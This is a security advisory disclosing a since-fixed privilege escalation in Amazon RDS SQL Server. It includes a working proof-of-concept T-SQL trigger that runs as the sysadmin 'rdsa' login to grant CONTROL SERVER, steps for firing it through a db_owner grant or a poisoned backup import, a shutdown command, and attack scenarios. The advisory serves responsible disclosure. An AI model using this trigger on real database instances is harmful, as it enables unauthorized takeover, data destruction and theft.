---
title: 'Amazon: RDSS SQL Server'
severity: Moderate
ghsa_id: GHSA-6q3w-cw5q-j62f
cve_id: null
weaknesses: []
products:
- ecosystem: Amazon
  package_name: RDSS SQL Server
  affected_versions: RDS Components Are Not Publicly Disclosed
  patched_versions: ''
cvss: null
credits:
- github_user_id: tesh42
  name: Sergei Namniasov
  avatar: https://avatars.githubusercontent.com/u/9165795?s=40&v=4
---

### Summary
An arbitrary code can be executed on a managed Amazon RDS SQL Server instance with sysadmin privileges via a [database-level trigger](https://learn.microsoft.com/en-us/sql/relational-databases/triggers/manage-trigger-security) running under the context of the user that calls the trigger. 


### Severity
Moderate - The vulnerability allows for arbitrary code to be executed on a managed Amazon RDS SQL server with sysadmin privileges which can be leveraged to take control of the server.  This vulnerability cannot be used to cause cross-customer impact / database host breakout.

### Proof of Concept
Below is an example of a trigger that runs an arbitrary code with unrestricted access. The trigger grants `CONTROL SEVER` permission to a customer user. `CONTROL SERVER` permission allows a login to impersonate any login on the server including the `rdsa` login that has sysadmin permissions. Effectively, it grants sysadmin permissions without adding the target login to the `sysadmin` server role. 
The trigger is set up to be called when a database user is denied permissions (FOR DENY_DATABASE). RDS uses `rdsa` login with sysadmin permissions to deny permissions to a database user when it is added to the `db_owner` database role.
The trigger will be executed under the context of the login that calls the trigger (EXECUTE AS CALLER). In our case, it will be called under the context of the `rdsa` login, which has sysadmin permissions.

```sql
CREATE OR ALTER TRIGGER evil_trigger ON DATABASE
WITH EXECUTE AS CALLER, ENCRYPTION
FOR DENY_DATABASE
AS
BEGIN
  DECLARE @sql NVARCHAR(MAX) ='DROP TRIGGER evil_trigger ON DATABASE;USE master;GRANT CONTROL SERVER TO admin WITH GRANT OPTION;';
  EXEC (@sql);
END
```
#### Elevate Privileges
Option 1:
Create that trigger in a database of the target instance.
Create a user and add that user to the `db_owner` database role:

```sql
CREATE USER test;
EXEC sp_addrolemember 'db_owner', 'test';
```
Option 2:
Create that trigger in a database on an instance. Create a backup of that database. Import that backup on the target instance:
```sql
exec msdb.dbo.rds_backup_database
        @source_db_name='testdb',
        @s3_arn_to_backup_to='arn:aws:s3:::bucket/testdb.bak';
```

#### Run code with elevated privileges
Execute an arbitrary command with sysadmin privileges:
```sql
EXECUTE AS LOGIN='rdsa';
SELECT SUSER_NAME() AS login, USER_NAME() AS db_user;
SHUTDOWN WITH NOWAIT;
``` 


### Further Analysis
The following table and a database-level trigger can be used for identifying other event types that can be used for running arbitrary code with elevated privileges:
```sql
CREATE TABLE DDLEvents(
  event_date     DATETIME      NOT NULL,
  event_type     NVARCHAR(64)  NULL,
  event_ddl      NVARCHAR(max) NULL,
  event_xml      XML           NULL,
  database_name  NVARCHAR(255) NULL,
  [schema_name]  NVARCHAR(255) NULL,
  [object_name]  NVARCHAR(255) NULL,
  login_name     NVARCHAR(255) NULL
);

ALTER TABLE [DDLEvents] ADD  DEFAULT (GETDATE()) FOR event_date;
GO

CREATE OR ALTER TRIGGER protect_user ON DATABASE
WITH EXECUTE AS CALLER, ENCRYPTION
FOR DDL_DATABASE_LEVEL_EVENTS
AS
BEGIN
  SET NOCOUNT ON;
  DECLARE @EventData XML = EVENTDATA();

  INSERT INTO DDLEvents
  (
    event_type,
    event_ddl,
    event_xml,
    database_name,
    schema_name,
    object_name,
    login_name
  )
  SELECT
    @EventData.value('(/EVENT_INSTANCE/EventType)[1]',   'NVARCHAR(100)'),
    @EventData.value('(/EVENT_INSTANCE/TSQLCommand)[1]', 'NVARCHAR(MAX)'),
    @EventData,
    DB_NAME(),
    @EventData.value('(/EVENT_INSTANCE/SchemaName)[1]',  'NVARCHAR(255)'),
    @EventData.value('(/EVENT_INSTANCE/ObjectName)[1]',  'NVARCHAR(255)'),
    SUSER_SNAME();
END
```

Attack scenario 1:
Prerequisites:
(Option 1) An attacker has access to the instance, they have permission to import a database to the instance and they have permission to write to an S3 bucket associated with the instance.
(Option 2) There is a pipeline or a person that imports a database to an instance. An attacker has access to one of the segments of the pipeline which allows them to create a trigger in a database or replace a backup file.
(Option 3) An attacker convinces someone with required permissions to import a database.
The attacker prepares a backup of a database. That database has a trigger with the code that should be executed.
The attacker imports that backup to a SQL Server instance manually or through a data ingestion pipeline; or convinces someone to import the backup.
The code is executed with sysadmin permissions. Highest permissions which aren’t available to any customer user.

Attack scenario 2:
Prerequisites:
An attacker has permission to create a database trigger in a database on the target instance.
(Option 1) Create a database user and add it to the db_owner database role or wait for someone else to do it.
(Option 2) Run an RDS stored procedure that triggers the database trigger under the context of a user with sysadmin privileges or wait for someone to do that.
The code is executed with sysadmin permissions. Highest permissions which aren’t available to any customer user.

A login with sysadmin privileges has unrestricted access to SQL Server. They aren’t available to customers on a managed instance.An attacker with those privileges can:
Drop or change any data.
Run any RDS stored procedure enabled on the instance including exporting any data to an S3 bucket associated with the instance.
Create logins with any permissions and grant them access to the instance. If the attacker didn’t have direct access to the instance and they can connect to the server, they can create a login to connect to the instance.
If the instance is running on Windows, the attacker might use [extended procedures](https://www.imperva.com/blog/deep-dive-database-attacks-part-ii-delivery-execution-malicious-executables-sql-commands-sql-server/), [OLE automation](https://www.imperva.com/blog/how-to-exploit-sql-server-using-ole-automation/) or [unsafe CLR](https://learn.microsoft.com/en-us/sql/relational-databases/clr-integration/security/clr-integration-code-access-security?view=sql-server-ver16#unsafe) to run command line commands, [manipulate registry](https://www.imperva.com/blog/how-to-exploit-sql-server-using-registry-keys/) or work with OLE automation objects with permissions of the user that runs the SQL Server service.

### Timeline
**Date reported**: 11/01/2022
**Date fixed**: 01/27/2023
**Date disclosed**: 01/30/2023